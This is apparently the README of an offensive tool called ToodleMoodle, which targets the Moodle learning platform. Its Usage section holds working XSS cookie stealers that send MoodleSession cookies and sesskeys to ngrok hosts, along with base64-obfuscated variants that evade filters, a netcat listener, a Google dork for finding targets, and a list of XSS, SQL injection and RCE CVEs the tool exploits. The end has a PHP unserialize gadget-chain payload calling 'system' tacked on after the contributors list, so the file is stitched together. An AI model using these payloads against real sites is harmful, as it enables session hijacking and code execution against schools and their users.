# ToodleMoodle

![ToodleMoodle](images/ReadMeMoodleImage.png?raw=true)

## Installation

TODO: Write installation instructions here

## Usage

Google dork: This files describes API changes in core libraries and APIs inurl:lib/upgrade.txt

TODO: Write usage instructions here
Thanks moodle for giving code to pwn self:
https://docs.moodle.org/dev/Security:Cross-site_scripting
while true; do nc -l 9999; done

My cookie stealer:

``` html
<script>alert('xss');document.write('<img src="https://7ea30092.ngrok.io/?cookie=' + document.cookie + '" />')</script>
<script>document.write('<img src="https://7ea30092.ngrok.io/?session=' + document.cookie.match(new RegExp('(^| )MoodleSession=([^;]+)'))[2] + "&sesskey=" + M.cfg.sesskey + "&id=" + document.querySelectorAll('[data-userid]')[0].getAttribute("data-userid") + '" />')</script>
```

https://blog.innerht.ml/tag/clickjacking/ good demo of a button that follows the mouse.

https://moodle.org/mod/forum/discuss.php?d=384010 3.6 login as, hijack admin account implemented in clickjack.html

https://www.cvedetails.com/cve/CVE-2018-1045/ 3.3.4 XSS in calendar event name todo

https://moodle.org/mod/forum/discuss.php?d=345915 3.2.1 xss via url implemented

POC:
http://localhost/mod/assign/view.php?id=2&action=view"onload="document.body.appendChild(document.createElement('img')).src=('https://5fc418e2.ngrok.io/?session='.concat(document.cookie,'|',M.cfg.sesskey))

Encode payload in base64 then: 

"onload="eval(window.atob('ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbWcnKSkuc3JjPSgnaHR0cHM6Ly81ZmM0MThlMi5uZ3Jvay5pby8/c2Vzc2lvbj0nLmNvbmNhdChkb2N1bWVudC5jb29raWUsJ3wnLE0uY2ZnLnNlc3NrZXkpKQ=='))

or if eval is filtered:

"onload="new Function(window.atob('ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbWcnKSkuc3JjPSgnaHR0cHM6Ly81ZmM0MThlMi5uZ3Jvay5pby8/c2Vzc2lvbj0nLmNvbmNhdChkb2N1bWVudC5jb29raWUsJ3wnLE0uY2ZnLnNlc3NrZXkpKQ=='))()

The vulnerabilities we use are:

* Dashboard XSS CVE-2019-3847
* Assignment XSS CVE-2017-2578
* SQL Injection / Privilege escalation CVE-2017-2641
* RCE (must be teacher) CVE-2018-1133
* RCE (attacker needs permissions to create a quiz or at least be able to import questions)
CVE-2018-14630

https://packetstormsecurity.com/files/149426/Moodle-3.x-PHP-Unserialize-Remote-Code-Execution.html CVE-2018-14630

Features:

* Scan: the tool can detect version and suggest supported exploits
* Exploit RCE 2018-1133 and CVE-2018-14630
* Exploit 2017-2641 SQL injection (via user pref) (generate sqlmap command)
* Add XSS to account dashboard, generate clickjacker, using CVE-2019-3847 to hijack
session
* Add XSS to calendar, generate link for victim to click and steal session

## Development

TODO: Write development instructions here
Make sure you have crystal & openssl installed. For MacOs, run
```
brew install crystal openssl
```

It is critical to compile this project, that you add the following lines to your bash_profile or zshrc:
```
export PKG_CONFIG_PATH="/usr/local/opt/openssl/lib/pkgconfig:$PKG_CONFIG_PATH"
export LDFLAGS="-L/usr/local/opt/libffi/lib -L/usr/local/opt/openssl/lib -L/usr/local/opt/llvm@6/lib -Wl,-rpath,/usr/local/opt/llvm@6/lib -L/usr/local/opt/llvm@6/lib $LDFLAGS"
export CPPFLAGS="-I/usr/local/opt/openssl/include -I/usr/local/opt/llvm@6/include $CPPFLAGS"
```

This adds LLVM, LibFFI, and OpenSSL to your compiler flags.

Now you can run this project (this will compile the project, hence the long startup time): 
```
crystal run src/tmoodle.cr
```

You can also build an executable:
```
crystal build src/tmoodle.cr
```
Use the  --release flag for an optimized production build.

### Docker image setup
```
bin/moodle-docker-compose up
```

## Contributing

1. Fork it (<https://github.com/your-github-user/toodlemoodle/fork>)
2. Create your feature branch (`git checkout -b my-new-feature`)
3. Commit your changes (`git commit -am 'Add some feature'`)
4. Push to the branch (`git push origin my-new-feature`)
5. Create a new Pull Request

## Contributors

- [Riccardo Felluga](https://github.com/riccardofelluga) - contributor and maintainer
- [Claudio Spiess](https://github.com/your-github-user) - creator and maintainer

// Legacy format containing PHP serialisation.
            https://github.com/moodle/moodle/archive/v3.1.13.zip
            foreach ($data['#']['answer'] as $answerxml) {
                $ans = $format->import_answer($answerxml);
                $options = unserialize(stripslashes($ans->feedback['text']));
                // $payload = 
                // "O:15:\"\\core\\lock\\lock\":3:{s:6:\"\0*\0key\";O:23:\"\\core_availability\\tree\":1:{s:11:\"\0*\0children\";O:24:\"\\core\\dml\\recordset_walk\":2:{s:11:\"\0*\0callback\";s:6:\"system\";s:12:\"\0*\0recordset\";O:25:\"question_attempt_iterator\":2:{s:7:\"\0*\0quba\";O:26:\"question_usage_by_activity\":1:{s:19:\"\0*\0questionattempts\";a:1:{s:4:\"1337\";s:13:\"echo aawhoami\";}}s:8:\"\0*\0slots\";a:1:{i:0;i:1337;}}}}s:9:\"draggroup\";s:1:\"1\";s:8:\"infinite\";i:1;}";
                // $options = unserialize($payload);//unserialize(stripslashes($ans->feedback['text']));
                // echo $payload;
                
                // var_dump($options);
O:15:"\core\lock\lock":3:{s:6:"�*�key";O:23:"\core_availability\tree":1:{s:11:"�*�children";O:24:"\core\dml\recordset_walk":2:{s:11:"�*�callback";s:6:"system";s:12:"�*�recordset";O:25:"question_attempt_iterator":2:{s:7:"�*�quba";O:26:"question_usage_by_activity":1:{s:19:"�*�questionattempts";a:1:{s:4:"1337";s:13:"echo aawhoami";}}s:8:"�*�slots";a:1:{i:0;i:1337;}}}}s:9:"draggroup";s:1:"1";s:8:"infinite";i:1;}
